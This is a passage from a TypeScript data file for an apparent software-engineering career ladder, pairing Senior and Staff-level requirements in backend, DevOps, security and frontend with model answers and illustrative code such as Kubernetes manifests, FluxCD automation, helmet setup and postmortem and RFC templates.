req.log.info({ userId: req.user.id, action: 'create_todo' }, 'Todo created');
// → {"level":30,"reqId":"abc-123","userId":42,"action":"create_todo","msg":"Todo created"}

// Prometheus metrics endpoint (foresight-mini pattern):
app.get('/metrics', async (req, res) => {
  res.set('Content-Type', register.contentType);
  res.end(await register.metrics());
});`,
            language: "ts",
          },
          {
            text: "Hands-on Action Case: DB Connection Leaks, Locks & Deadlock Termination.",
            answer:
              "Querying pg_stat_activity and pg_locks to detect blocked queries and Connection Pool leaks, and terminating deadlocked sessions safely using pg_cancel_backend and pg_terminate_backend.",
            code: `-- Detect active connections & state
SELECT count(*), state, client_addr FROM pg_stat_activity WHERE datname = 'todo_db' GROUP BY state, client_addr;

-- Terminate blocked backend PID
SELECT pg_cancel_backend(12345);
SELECT pg_terminate_backend(12345);`,
            language: "sql",
          },
        ],
        keywords: [
          "load balancer",
          "horizontal scaling",
          "CAP theorem",
          "message queue",
          "event sourcing",
          "DataLoader",
          "GraphQL Federation",
          "cache-aside",
          "read replica",
          "TimescaleDB",
          "OpenTelemetry",
          "Jaeger",
        ],
        applicationNote:
          "todo-app includes GraphQL sharing service/repository layers with REST (eliminating logic duplication). ADR-worthy decisions exist in the codebase but are unwritten. The bug discovered (authenticateSession async middleware lacking asyncHandler wrapper → process crash) is prime postmortem material.",
        projectRefs: [
          {
            project: "todo-app",
            label: "be-node-express GraphQL + REST",
            path: "be-node-express/src",
            note: "GraphQL shares underlying service/repository with REST — no logic duplication",
            language: "ts",
            codeSnippet: `// be-node-express/src/graphql/schema.ts — GraphQL type defs
export const typeDefs = \`#graphql
  type Todo { id: ID!  title: String!  completed: Boolean!  createdAt: String! }
  type Query   { todos: [Todo!]!  todo(id: ID!): Todo }
  type Mutation {
    createTodo(title: String!, categoryId: ID): Todo!
    updateTodo(id: ID!, title: String, completed: Boolean): Todo!
    deleteTodo(id: ID!): DeleteTodoResult!
  }
\`;

// be-node-express/src/graphql/resolvers.ts
// Key point: resolvers call the SAME todoService/todoRepo used by REST routes
export const resolvers = {
  Query: {
    todos: async (_, __, ctx: GraphQLContext) => {
      const userId = requireUserId(ctx);
      const rows = await todoRepo.listAllTodosForUser(userId);
      return rows.map(toGraphTodo);
    },
  },
  Mutation: {
    createTodo: async (_, { title, categoryId }, ctx) => {
      const userId = requireUserId(ctx);
      // ← same todoService.createTodo used by POST /api/todos
      const todo = await todoService.createTodo(userId, title, categoryId ?? null);
      return toGraphTodo(todo);
    },
  },
};

// Result: business logic lives once in services/
// REST and GraphQL are just different transport layers over the same data`,
          },
          {
            project: "foresight-mini",
            label: "services/worker + services/api",
            path: "services",
            note: "Event-driven: NATS → worker writes to Postgres timeseries; api provides GraphQL query layer — classic IoT CQRS pattern",
            language: "ts",
            codeSnippet: `// Adapter pattern: stateless protocol translation only.
// MQTT → NATS. No business logic beyond format conversion.
mqttClient.on("message", (topic, payloadBuf) => {
  try {
    const payload = JSON.parse(payloadBuf.toString());
    const subject =
      \`sensors.readings.\${payload.deviceId}.\${payload.sensorId}\`;
    nc.publish(subject, sc.encode(JSON.stringify(payload)));
  } catch (err) {
    console.error('[adapter] failed to process message', err);
  }
});

// Worker (Controller + TSDB-writer):
// Reconcile graph entities, then append timeseries reading.
async function upsertGraph(reading) {
  await pool.query(
    'INSERT INTO buildings (id, name) VALUES ($1, $2)\n     ON CONFLICT (id) DO NOTHING',
    [reading.buildingId, reading.buildingName],
  );
  // same for devices + sensors...
}`,
          },
          {
            project: "foresight-mini",
            label: "docs/postmortem-worker-crash-2026-08-05.md",
            path: "docs/postmortem-worker-crash-2026-08-05.md",
            note: "Real postmortem template — worker crash RCA with 5-whys and action items",
            language: "ts",
            codeSnippet: `// foresight-mini api — structured logging + Redis cache
export const logger = pino({
  level: process.env.LOG_LEVEL ?? 'info',
  transport:
    process.env.NODE_ENV === 'development'
      ? { target: 'pino-pretty' }
      : undefined,
});

const redis = new Redis(REDIS_URL, {
  lazyConnect: true,
  maxRetriesPerRequest: 1,
  enableOfflineQueue: false,
});

// Non-fatal: fall through to Postgres if Redis unavailable.
redis.on('error', (err) => {
  logger.warn(
    { err },
    '[api] Redis error — cache disabled for this request',
  );
});`,
          },
          {
            project: "foresight-2",
            label: "NATS JetStream (foresight-cloud/platform/nats/)",
            path: "repo/foresight-cloud/platform/nats",
            note: "Production event streaming: MQTT IoT data → NATS JetStream → TimescaleDB historian",
            language: "yaml",
            codeSnippet: `# foresight-cloud/platform/nats/base/nats.HelmRelease.yaml
apiVersion: helm.toolkit.fluxcd.io/v2beta2
kind: HelmRelease
metadata:
  name: nats
spec:
  interval: 10m
  chart:
    spec:
      chart: nats
      version: 1.3.14
      sourceRef:
        kind: HelmRepository
        name: nats
  values:
    config:
      cluster:
        enabled: true
        replicas: 3    # ← HA cluster, survives 1 node failure

      jetstream:
        enabled: true
        memoryStore:
          enabled: true
          maxSize: 2Gi
        fileStorage:
          enabled: true
          pvc:
            enabled: true
            size: 10Gi  # ← persistent: messages survive worker restarts
                        #   (contrast with foresight-mini where NATS core
                        #    loses messages if worker is down)
      mqtt:
        enabled: true   # IoT devices connect via MQTT to NATS directly

    promExporter:
      enabled: true
      podMonitor:
        enabled: true   # scraped by kube-prometheus-stack`,
          },
          {
            project: "foresight-2",
            label: "federated-graph/src/gateway.ts",
            path: "repo/federated-graph",
            note: "Apollo Federation composing foresight-bgs + graph-service + others into one unified schema",
            language: "ts",
            codeSnippet: `// federated-graph/src/gateway.ts — Apollo Federation gateway
export async function createGateway(): Promise<ApolloGateway> {
  return new ApolloGateway({
    supergraphSdl: new IntrospectAndCompose({
      subgraphs: await loadSubgraphs(),   // each microservice is a subgraph
      pollIntervalInMs: config.subgraphPollIntervalInMs,
    }),
    serviceHealthCheck: true,

    // Custom data source: forwards auth headers from the client request
    // down to every subgraph so they can enforce their own authorization.
    buildService({ url }) {
      return new (class extends RemoteGraphQLDataSource {
        willSendRequest(options) {
          if (options.kind === GraphQLDataSourceRequestKind.INCOMING_OPERATION) {
            // Forward all auth/identity headers to subgraphs
            const forwardedHeaders = [
              'authorization',
              'x-auth-request-access-token',
              'x-auth-request-email',
              'x-auth-request-groups',
              'piscada-api-version',  // ← API version header for breaking changes
            ];
            for (const header of forwardedHeaders) {
              const val = options.incomingRequestContext.request.http?.headers.get(header);
              if (val) options.request.http?.headers.set(header, val);
            }
          }
        }
      })({ url });
    },
  });
}`,
          },
        ],
        gaps: [
          "No Redis caching layer.",
          "No structured logging (pino) — still using console.log/console.error.",
          "No distributed tracing.",
          "Senior artifacts unwritten: postmortem for async bug, ADR for auth strategy decision.",
        ],
      },
      {
        name: "DevOps",
        status: "not-met",
        requirements: [
          {
            text: "Kubernetes fundamentals: Pods, Deployments, Services, Ingress.",
            answer:
              "Pod: smallest unit, 1+ containers sharing network. Deployment: manages N replicas, rolling updates. Service: stable DNS name + load balancing across pods. Ingress: HTTP routing rules (host/path-based) into the cluster. ConfigMap/Secret: inject config/creds without baking them into images.",
            code: `# Deployment: 3 replicas of the todo backend
apiVersion: apps/v1
kind: Deployment
metadata:
  name: todo-backend
spec:
  replicas: 3
  selector:
    matchLabels: { app: todo-backend }
  template:
    metadata:
      labels: { app: todo-backend }
    spec:
      containers:
        - name: backend
          image: ghcr.io/user/todo-be:latest
          ports: [{ containerPort: 5001 }]
          env:
            - name: DATABASE_URL
              valueFrom:
                secretKeyRef: { name: todo-secrets, key: database-url }
          livenessProbe:
            httpGet: { path: /health, port: 5001 }
            initialDelaySeconds: 10
---
apiVersion: v1
kind: Service
metadata:
  name: todo-backend
spec:
  selector: { app: todo-backend }
  ports: [{ port: 80, targetPort: 5001 }]`,
            language: "yaml",
          },
          {
            text: "GitOps: declarative infrastructure via FluxCD/ArgoCD, image automation.",
            answer:
              "GitOps: Git is the single source of truth for cluster state. FluxCD watches the repo and reconciles cluster state to match. image-reflector-controller detects new registry tags; image-automation-controller commits the new tag to Git; Flux deploys it. No manual kubectl apply — every change is a PR.",
            code: `# FluxCD image automation (foresight-2 pattern)
# 1. ImageRepository: watch registry for new tags
apiVersion: image.toolkit.fluxcd.io/v1beta2
kind: ImageRepository
metadata:
  name: todo-backend
spec:
  image: ghcr.io/user/todo-be
  interval: 5m
---
# 2. ImagePolicy: select tag matching semver
apiVersion: image.toolkit.fluxcd.io/v1beta2
kind: ImagePolicy
metadata:
  name: todo-backend
spec:
  imageRepositoryRef: { name: todo-backend }
  policy:
    semver: { range: '>=1.0.0' }
---
# 3. In Deployment: annotation triggers auto-commit on new tag
# image: ghcr.io/user/todo-be:1.2.3 # {"$imagepolicy": "flux-system:todo-backend"}
# image-automation-controller updates this line, commits to Git
# Flux reconciles cluster state — no manual deploy needed`,
            language: "yaml",
          },
          {
            text: "Secrets management: Sealed Secrets or Vault, never plaintext secrets in Git.",
            answer:
              "Plain Kubernetes Secrets are base64-encoded — not encrypted. Never commit them to Git. Sealed Secrets: encrypt with the cluster's public key; only the controller inside the cluster can decrypt. Even if the Git repo is public, the secret is safe.",
            code: `# Sealed Secret: encrypted in Git, decrypted only by the cluster controller
# Created with: kubeseal --cert=pub-cert.pem -f secret.yaml -o yaml > sealed.yaml
apiVersion: bitnami.com/v1alpha1
kind: SealedSecret
metadata:
  name: todo-secrets
  namespace: default
spec:
  encryptedData:
    # This ciphertext decrypts only inside the target cluster
    database-url: AgBy3i4OJSWK+PiTySYZZA9rO43cGDEq...
    jwt-secret:   AgCi9z0Q1H3KvIvGgS1F3jL8mY...

# Regular Secret NEVER committed to Git:
# apiVersion: v1
# kind: Secret
# data:
#   database-url: cG9zdGdyZXM6Ly8...  # just base64!
#   # Anyone with Git access can decode this`,
            language: "yaml",
          },
          {
            text: "Hands-on Action Case: Automated CI/CD SSH Deployment & Fail2ban Hardening.",
            answer:
              "Configuring GitHub Actions workflow to SSH into Ubuntu VM with secrets, pull git updates, rebuild containers, and configuring Fail2ban to automatically block brute-force IP attacks on SSH port.",
            code: `# Fail2ban status
sudo apt install -y fail2ban
sudo fail2ban-client status sshd

# Disable SSH password auth (/etc/ssh/sshd_config)
PasswordAuthentication no
PubkeyAuthentication yes`,
            language: "bash",
          },
        ],
        keywords: [
          "Kubernetes",
          "kubectl",
          "HPA",
          "Ingress",
          "FluxCD",
          "ArgoCD",
          "GitOps",
          "Prometheus",
          "ServiceMonitor",
          "Jaeger",
          "Sealed Secrets",
          "Vault",
        ],
        applicationNote:
          "todo-app does not use Kubernetes. The foresight-2 repo is the definitive reference for this domain at Senior level.",
        projectRefs: [
          {
            project: "foresight-mini",
            label: "docs/ADR-001-docker-compose-vs-kubernetes.md",
            path: "docs/adr/ADR-001-docker-compose-vs-kubernetes.md",
            note: "ADR template: explicit decision + rationale + tradeoff table + 'when to revisit' criteria",
            language: "markdown",
            codeSnippet: `# ADR-001: docker-compose vs Kubernetes for foresight-mini
# Status: Accepted | Date: 2026-08-05

## Decision
Keep docker-compose. Do NOT migrate to Kubernetes.

## Rationale (tradeoff table)
| Criterion            | docker-compose                  | Kubernetes                          |
|----------------------|---------------------------------|-------------------------------------|
| Developer setup      | docker compose up --build       | minikube + kubectl + Helm + registry |
| Time to first run    | < 60 seconds                    | 5–20 minutes                        |
| Operational overhead | None                            | etcd, control plane, kubelet, CNI   |
| Restart policy       | restart: unless-stopped         | Deployment + liveness probes        |
| Secrets              | .env (acceptable for local dev) | Secrets + external-secrets-operator |

## When Kubernetes WOULD be justified
1. Traffic: sustained load requiring horizontal scaling (multiple api replicas)
2. Multi-environment: dev/staging/prod with different configs per env
3. Compliance: data residency requirements across regions
4. Team: dedicated platform engineer to manage the control plane

## Consequence
foresight-2 (real production) uses Kubernetes + FluxCD + Sealed Secrets.
foresight-mini stays simple to keep the learning curve on the application code,
not the infrastructure.`,
          },
          {
            project: "foresight-2",
            label: "foresight-cloud (FluxCD GitOps)",
            path: "repo/foresight-cloud",
            note: "Full FluxCD: base/ + overlays/{dev,staging,prod}, ImagePolicy + ImageUpdateAutomation auto-commits new tags to Git",
            language: "yaml",
            codeSnippet: `# FluxCD image automation: when a new image is pushed to the registry,
# FluxCD automatically commits the new tag to Git, triggering a rollout.

# ImagePolicy: which semver tags to watch
apiVersion: image.toolkit.fluxcd.io/v1beta2
kind: ImagePolicy
metadata:
  name: emqx-http-auth
spec:
  imageRepositoryRef:
    name: emqx-http-auth
  policy:
    semver:
      range: '^0.x.x'  # any 0.x.x release

---
# ImageUpdateAutomation: commit new tags to Git automatically
apiVersion: image.toolkit.fluxcd.io/v1beta1
kind: ImageUpdateAutomation
metadata:
  name: emqx-http-auth
spec:
  interval: 1m0s
  sourceRef:
    kind: GitRepository
    name: flux-system
    namespace: flux-system
  git:
    checkout:
      ref: { branch: \${BRANCH} }
    commit:
      author:
        email: fluxcdbot@piscada.com
        name: fluxcdbot
      messageTemplate: "[FSFluxImageAutomation] {{range .Updated.Images}}{{println .}}{{end}}"
    push:
      branch: \${BRANCH}
# Result: push image → FluxCD detects new tag → commits updated manifest to Git
#        → FluxCD reconciles cluster to match Git — GitOps loop`,
          },
          {
            project: "foresight-2",
            label: "foresight-cloud/platform/monitoring/",
            path: "repo/foresight-cloud/platform/monitoring",
            note: "HelmRelease + HelmRepository for kube-prometheus-stack — Prometheus + Grafana + Alertmanager in K8s",
            language: "yaml",
            codeSnippet: `# foresight-cloud/platform/monitoring/kube-prometheus-stack/

# HelmRepository: tells FluxCD where to find the Helm chart
apiVersion: source.toolkit.fluxcd.io/v1beta1
kind: HelmRepository
metadata:
  name: prometheus-community
spec:
  url: https://prometheus-community.github.io/helm-charts
  interval: 24h

---
# NATS also exposes a PodMonitor for scraping JetStream metrics
# (from nats.HelmRelease.yaml values):
promExporter:
  enabled: true
  podMonitor:
    enabled: true
    merge:
      metadata:
        labels:
          release: kube-prometheus-stack   # ← label must match Prometheus
                                           #   serviceMonitorSelector to be
                                           #   auto-discovered
# Pattern: every service exposes /metrics (Prometheus format).
# PodMonitor/ServiceMonitor CRDs register scrape targets without
# editing the central Prometheus config.`,
          },
        ],
        gaps: [
          "No Kubernetes manifests.",
          "No Prometheus/Grafana/Jaeger.",
          "No Sealed Secrets or secrets manager.",
          "Write an ADR documenting the current docker-compose decision and what would need to change at 10x scale.",
        ],
      },
      {
        name: "Security",
        status: "partial",
        requirements: [
          {
            text: "Security headers: helmet (CSP, HSTS, X-Frame-Options).",
            answer:
              "helmet sets ~15 security headers in one call. CSP: whitelists script/style sources — prevents XSS script execution even if injection occurs. HSTS: forces HTTPS for future visits. X-Frame-Options: prevents clickjacking via iframes. Takes <30 min, eliminates an entire class of browser attacks.",
            code: `import helmet from 'helmet';

export async function buildApp() {
  const app = express();

  // One line adds ~15 security headers:
  app.use(helmet({
    // Disable CSP for GraphQL playground in dev;
    // enable strict CSP in production:
    contentSecurityPolicy: process.env.NODE_ENV === 'production'
      ? {
          directives: {
            defaultSrc: ["'self'"],
            scriptSrc: ["'self'"],  // no inline scripts
            objectSrc: ["'none'"],
          },
        }
      : false,
  }));

  // Headers added by helmet:
  // Strict-Transport-Security: max-age=15552000 (HSTS)
  // X-Frame-Options: SAMEORIGIN (clickjacking)
  // X-Content-Type-Options: nosniff
  // X-DNS-Prefetch-Control: off
  // Referrer-Policy: no-referrer
  // ...and more
}`,
            language: "ts",
          },
          {
            text: "Least-privilege database roles — app connects as restricted role, not superuser.",
            answer:
              "The postgres superuser can DROP TABLE, CREATE DATABASE, read pg_shadow. If the app is compromised, an attacker with superuser can do anything. A restricted role can only SELECT/INSERT/UPDATE/DELETE on specific tables — blast radius is contained.",
            code: `-- Create restricted app role (run as postgres superuser once)
CREATE ROLE todo_app_user WITH LOGIN PASSWORD 'strong-password';

-- Grant only what the app needs
GRANT CONNECT ON DATABASE todo_db TO todo_app_user;
GRANT USAGE ON SCHEMA public TO todo_app_user;
GRANT SELECT, INSERT, UPDATE, DELETE
  ON todos, categories, users, sessions, refresh_tokens
  TO todo_app_user;
GRANT USAGE, SELECT ON ALL SEQUENCES IN SCHEMA public TO todo_app_user;

-- Explicitly deny sensitive operations:
-- REVOKE CREATE ON SCHEMA public FROM todo_app_user;
-- (can't DROP TABLE, can't CREATE TABLE, can't read other DBs)

-- .env: use restricted role, not postgres/postgres
DATABASE_URL=postgresql://todo_app_user:strong-password@db:5432/todo_db`,
            language: "sql",
          },
        ],
        keywords: [
          "CSP",
          "HSTS",
          "helmet",
          "SAST",
          "DAST",
          "Trivy",
          "Snyk",
          "SBOM",
          "Sealed Secrets",
          "Vault",
          "least-privilege",
          "supply-chain security",
        ],
        applicationNote:
          "todo-app has bcrypt, parameterized queries, JWT refresh rotation, rate limiting — solid foundation. Gaps: no helmet, no CI security scanning, connects as postgres superuser.",
        projectRefs: [
          {
            project: "todo-app",
            label: "be-node-express/src/app.ts (missing helmet)",
            path: "be-node-express/src/app.ts",
            note: "Add helmet() here — <30 min task, high impact: CSP, HSTS, X-Frame-Options",
            language: "ts",
            codeSnippet: `import helmet from 'helmet';

export async function buildApp() {
  const app = express();

  // Security headers: CSP, HSTS, X-Frame-Options,
  // X-Content-Type-Options, etc.
  // contentSecurityPolicy disabled for GraphQL playground.
  app.use(helmet({ contentSecurityPolicy: false }));

  // credentials:true + reflected origin required for
  // session-cookie demo across different ports.
  // Never use origin:'*' with credentials:true.
  app.use(cors({ origin: true, credentials: true }));

  app.get('/health', (_req, res) => res.json({ status: 'ok' }));
  // ... routes, Apollo, error handler
}`,
          },
          {
            project: "foresight-2",
            label: "Sealed Secrets (oauth2-proxy.SealedSecret.yaml)",
            path: "repo/foresight-cloud/platform/oauth2-proxy/base/oauth2-proxy.SealedSecret.yaml",
            note: "Secrets encrypted with cluster public key — safe to commit to Git, only decryptable by the cluster controller",
            language: "yaml",
            codeSnippet: `# oauth2-proxy.SealedSecret.yaml
# Encrypted with the cluster's public key using kubeseal.
# Safe to commit to Git — only the cluster's SealedSecrets controller
# (which holds the private key) can decrypt it.
apiVersion: bitnami.com/v1alpha1
kind: SealedSecret
metadata:
  name: oauth2-proxy
spec:
  encryptedData:
    # These values are encrypted ciphertexts, not real secrets.
    # kubeseal: cat secret.yaml | kubeseal --cert pub-cert.pem -o yaml > sealed.yaml
    client-id:     \${OAUTH2_PROXY_CLIENT_ID}      # base64+encrypted
    client-secret: \${OAUTH2_PROXY_CLIENT_SECRET}  # base64+encrypted
    cookie-secret: \${OAUTH2_PROXY_COOKIE_SECRET}  # base64+encrypted
  template:
    metadata:
      name: oauth2-proxy
      namespace: oauth2-proxy
    type: opaque

# vs. plain K8s Secret (NEVER commit this):
# apiVersion: v1
# kind: Secret
# data:
#   client-secret: c3VwZXJzZWNyZXQ=  # just base64 — readable by anyone`,
          },
          {
            project: "foresight-2",
            label: "bitbucket-pipelines.yml sbom-scan-deploy",
            path: "repo/foresight-energy-v1/bitbucket-pipelines.yml",
            note: "SBOM scanning on deploy + SonarQube SAST + nightly npm audit:check — full CI security integration",
            language: "yaml",
            codeSnippet: `# foresight-energy-v1/bitbucket-pipelines.yml (key security steps)
image: node:20

definitions:
  steps:
    - step: &code-type-check
        name: Code lint and type check
        script:
          # Nexus private registry auth (no hardcoded credentials)
          - mv .npmrc_config .npmrc
          - NEXUS_AUTH=$(echo -n "$NEXUS_NPM_PUBLISH_PASSWORD" | openssl enc -base64)
          - echo "//nexus.piscada.tools/:_password=$NEXUS_AUTH" >> .npmrc
          - yarn install --frozen-lockfile
          - yarn tsc --noEmit

    - step: &sonar-qube-scan
        name: SonarQube SAST Scan
        image: sonarsource/sonar-scanner-cli:4
        script:
          - sonar-scanner
            -Dsonar.projectKey=piscada.foresight.energy-frontend-v1
            -Dsonar.host.url=https://sonarqube.piscada.tools
            -Dsonar.login=$SONAR_LOGIN

    - step: &sbom-scan-deploy
        name: Generate and upload SBOM (Software Bill of Materials)
        size: 2x
        services: [docker]
        script:
          # Generate SBOM listing every dependency + version
          # Upload to dependency-track for CVE monitoring
          - ... (syft or cyclonedx-bom)`,
          },
        ],
        gaps: [
          "Missing helmet() in src/app.ts — add CSP, HSTS, X-Frame-Options.",
          "3 transitive npm audit vulnerabilities unresolved.",
          "Connects as postgres/postgres superuser instead of restricted app role.",
          "No SAST/dependency scanning step in CI.",
        ],
      },
    ],
  },
  {
    id: 5,
    slug: "staff-lead",
    title: "Level 5",
    subtitle: "Staff / Tech Lead",
    experience: "6 – 10 years",
    overallStatus: "🔴 Not Met",
    statusColor: "red",
    selfCheck:
      "You have authored: an RFC addressing a concrete system failure scenario at scale, a technical debt register with prioritized remediation roadmap, and have led (or can articulate leading) a cross-team architectural decision with documented dissent and consensus. You can discuss CAP theorem tradeoffs from a real codebase example, not an abstract definition.",
    domains: [
      {
        name: "Frontend",
        status: "not-met",
        requirements: [
          {
            text: "Defining and enforcing frontend conventions across teams.",
            answer:
              "At Staff level, your decisions affect multiple teams. Conventions enforced via linting rules and AGENTS.md are more durable than docs. Example: foresight-cloud-bms AGENTS.md mandates the exact TanStack Query factory pattern — reviewers reject PRs that deviate, so the codebase stays consistent at scale.",
            code: `// AGENTS.md convention (foresight-2 pattern):
// Each data hook must follow the 3-file pattern:
//   hooks/data/useBuildings/
//     index.types.ts  — interfaces only
//     query.ts        — queryOptions factory
//     index.ts        — exported consumer hook

// query.ts — the factory pattern:
import { queryOptions } from '@tanstack/react-query';
import { fetchBuildings } from '../api';

export const buildingsQueryOptions = queryOptions({
  queryKey: ['buildings'],
  queryFn: fetchBuildings,
  staleTime: Number.POSITIVE_INFINITY, // buildings don't change during session
});

// index.ts — consumer hook (no inlining queryOptions here)
export function useBuildings() {
  return useQuery(buildingsQueryOptions);
}
// This pattern is enforced by lint rule — not optional.`,
            language: "ts",
          },
          {
            text: "Evaluating framework migrations: legacy vs modern stack tradeoffs.",
            answer:
              "The Staff question is never 'which tech is better' but 'what is the total cost and risk of migrating, and does it justify diverting engineers from revenue features?' Foresight runs two FE stacks simultaneously: legacy (revenue) and new (future). The decision to migrate is an executive one — Staff frames it as a proposal with cost/benefit.",
            code: `// Staff-level migration analysis framing (not a code problem):

// Option A: Complete foresight-cloud-bms (new stack)
Pros: validates new TanStack Start SSR stack, unifies future codebase
Cons: 6+ months, no revenue during, legacy still needs bug fixes
Risk: New stack may need pivots after real user traffic

// Option B: Continue shipping on legacy stacks
Pros: immediate feature velocity on revenue-generating product
Cons: growing technical debt, dual-stack maintenance burden
Risk: Legacy stack harder to hire for over time

// Option C: Incremental migration (route-by-route)
Pros: de-risks migration, shows progress, partial revenue continuity
Cons: longer total duration, both stacks live simultaneously longer
Recommendation: C, with milestone gate at 3 months: if X routes
migrated without regressions, continue; else pause and reassess.`,
            language: "ts",
          },
        ],
        keywords: [
          "design system",
          "component library",
          "semver",
          "breaking change",
          "monorepo tooling",
          "Turborepo/Nx",
          "Lighthouse CI",
          "performance budget",
          "framework migration",
        ],
        applicationNote:
          "This level requires written artifacts more than code. Foresight-2 has the richest reference material: dual concurrent stacks (legacy + modern), AGENTS.md convention enforcement.",
        projectRefs: [
          {
            project: "foresight-2",
            label: "foresight-cloud-bms/AGENTS.md",
            path: "repo/foresight-cloud-bms/AGENTS.md",
            note: "Convention enforcement at org level: custom hook patterns, TanStack Query rules, test structure",
          },
          {
            project: "foresight-2",
            label:
              "Dual FE stacks (foresight-cloud-bms vs foresight-facilities-v1)",
            path: "repo",
            note: "Staff Question: complete new BMS stack vs ship features on legacy revenue-generating apps?",
          },
        ],
        gaps: [
          "Artifact needed: RFC or tech debt memo analyzing the legacy vs new frontend stack decision at Foresight (or equivalent scenario in todo-app).",
        ],
      },
      {
        name: "Backend",
        status: "not-met",
        requirements: [
          {
            text: "RFC writing: problem statement, enumerated alternatives with tradeoffs, explicit recommendation.",
            answer:
              "An RFC is not a design doc — it's a decision proposal. Format: problem (1 para), constraints, 3 alternatives (each with pros/cons), recommendation with rationale, open questions. The goal is to surface implicit assumptions and get alignment before writing code.",
            code: `# RFC-001: Multi-Tenant Authentication for todo-app

## Problem
todo-app currently uses a single shared DB with user_id isolation.
Adding a second organization requires either:
- Shared schema (current) with org_id column
- Separate schema per org (Postgres schemas)
- Separate DB per org

## Constraints
- Must not break existing single-tenant users
- Migration must be zero-downtime
- Team has 2 weeks before the next sprint

## Alternatives

### A: Add org_id column (shared schema)
Pros: minimal code change, works with current pool config
Cons: every query needs WHERE org_id=X; one slow query affects all orgs
Risk: Missing org_id filter = data leak between orgs

### B: Postgres schemas per org
Pros: strong isolation, no filter-every-query risk
Cons: connection pool management complex, migration tooling harder

### C: Separate databases
Pros: complete isolation, independent scaling
Cons: 10x infrastructure cost, connection pools multiply

## Recommendation
Option A with mandatory Row Level Security (RLS) policy:
CREATE POLICY todo_isolation ON todos
  USING (org_id = current_setting('app.org_id')::int);
-- RLS enforces the filter at DB level, can't be forgotten in code.`,
            language: "bash",
          },
          {
            text: "Blameless postmortems: timeline, 5-whys RCA, actionable follow-ups.",
            answer:
              "Blameless = the system failed, not the person. Focus on why conditions existed that made the mistake possible, not who made it. 5-whys: keep asking 'why' until you reach a systemic cause (missing test, missing lint rule, missing review checklist). Actions must have owners and due dates — vague actions get ignored.",
            code: `# Postmortem: Worker Crash 2026-08-05

## Impact
foresight-mini worker crashed at 14:32 UTC.
No sensor readings written for 47 minutes.
Affected: all 3 buildings, 12 sensors.

## Timeline
14:32 - Worker process exited (code 1)
14:35 - Alert fired (Prometheus: worker_up == 0)
14:41 - On-call acknowledged
15:19 - Root cause identified: uncaught promise rejection
15:24 - Fix deployed, worker healthy

## Root Cause (5-Whys)
1. Worker crashed    <- WHY?
2. Uncaught rejection in NATS message handler  <- WHY?
3. upsertGraph threw on malformed payload  <- WHY?
4. No error handling around JSON.parse  <- WHY?
5. No tests for malformed payloads  <- WHY?
6. No test suite existed for the worker service

## Actions
| Action | Owner | Due |
|--------|-------|-----|
| Add try/catch around all message handlers | @dev | 2026-08-07 |
| Add Vitest suite: malformed payload tests | @dev | 2026-08-10 |
| Add worker_errors_total Prometheus counter | @dev | 2026-08-12 |`,
            language: "bash",
          },
        ],
        keywords: [
          "bounded context",
          "DDD",
          "event storming",
          "RFC",
          "ADR",
          "capacity planning",
          "SLO/SLA/SLI",
          "postmortem",
          "RCA",
          "blameless culture",
          "tech debt register",
        ],
        applicationNote:
          "todo-app cannot demonstrate this level through code alone. Author artifacts using this project as the topic.",
        projectRefs: [
          {
            project: "foresight-mini",
            label: "docs/RFC-001-multi-tenant-auth.md",
            path: "docs/RFC-001-multi-tenant-auth.md",
            note: "Reference RFC format: problem statement, alternatives, tradeoffs, recommendation — use as template",
          },
          {
            project: "foresight-mini",
            label: "docs/SLO-graphql-api.md",
            path: "docs/SLO-graphql-api.md",
            note: "SLO definition with SLI measurements, error budget, alerting thresholds",
          },
          {
            project: "foresight-mini",
            label: "docs/postmortem-worker-crash-2026-08-05.md",
            path: "docs/postmortem-worker-crash-2026-08-05.md",
            note: "Blameless postmortem: timeline, 5-whys RCA, action items with owners and due dates",
          },
          {
            project: "foresight-2",
            label: "BGS replication CAP tradeoff",
            path: "repo/foresight-bgs/API/README_REPLICATION.md",
            note: "If replication fails, entire mutation fails — CAP consistency-over-availability decision, RFC material",
          },
        ],
        gaps: [
          'Write RFC: "What breaks at 10M users in todo-app?" — enumerate bottlenecks, propose solutions.',
          "Write postmortem for the authenticateSession async bug (real incident in this codebase).",
          "Write technical debt register for todo-app current gaps.",
        ],
      },
      {
        name: "DevOps",
        status: "not-met",
        requirements: [
          {
            text: "SRE practices: error budgets, toil reduction, runbooks.",
            answer:
              "SLO: 'todos API p99 < 200ms, 99.9% of requests'. SLI: the actual measurement (Prometheus histogram). Error budget: 1 - 99.9% = 0.1% of requests can fail/slow per month before the team stops shipping features and focuses on reliability. Toil: manual, repetitive ops work that should be automated.",
            code: `# SLO Definition (foresight-mini pattern)
## GraphQL API SLO

### SLI: Request Success Rate
Definition: HTTP 2xx responses / total responses (excluding health checks)
Measurement: rate(http_requests_total{status=~"2.."}[5m]) /
             rate(http_requests_total[5m])

### SLO Target: 99.5% over 30-day rolling window

### Error Budget
Total requests in 30 days: ~2.6M (1 req/sec average)
Allowed failures: 0.5% = 13,000 failures
Error budget burn rate alert: if burning > 5x baseline rate,
page on-call (will exhaust budget in 6 days)

### Runbook: High Error Rate
1. Check Grafana dashboard: which endpoint?
2. Check recent deploys: git log --since='1 hour ago'
3. If new deploy: rollback with kubectl rollout undo
4. If infra: check Postgres connection pool (PgBouncer)
5. Escalate to #platform-oncall if not resolved in 15 min`,
            language: "bash",
          },
        ],
        keywords: [
          "RBAC",
          "namespace isolation",
          "multi-cluster",
          "GitOps maturity",
          "error budget",
          "toil",
          "runbook",
          "IDP",
          "golden path",
          "FinOps",
          "spot instance",
        ],
        applicationNote:
          "This level is demonstrated through artifacts + Foresight-2 code reading. Real production reference: FluxCD GitOps with image automation.",
        projectRefs: [
          {
            project: "foresight-2",
            label: "foresight-cloud FluxCD image automation",
            path: "repo/foresight-cloud",
            note: "image-reflector-controller detects new registry tags → image-automation-controller commits to Git → Flux reconciles cluster. No manual kubectl.",
          },
        ],
        gaps: [
          "Write an SLO document for todo-app backend using foresight-mini SLO-graphql-api.md as template.",
        ],
      },
      {
        name: "Security",
        status: "not-met",
        requirements: [
          {
            text: "Threat modeling (STRIDE): systematic identification of threats.",
            answer:
              "STRIDE: Spoofing (impersonate), Tampering (modify data), Repudiation (deny action), Information Disclosure (leak data), Denial of Service (crash system), Elevation of Privilege (gain unauthorized access). Apply to each component and data flow in a system diagram. Output: threat table with mitigations.",
            code: `# STRIDE Threat Model: todo-app auth flows

## Data Flow: POST /api/auth/login

| # | Threat | STRIDE | Mitigation | Status |
|---|--------|--------|------------|--------|
| 1 | Attacker guesses passwords | S | Rate limiting (20/15min) | ✅ Done |
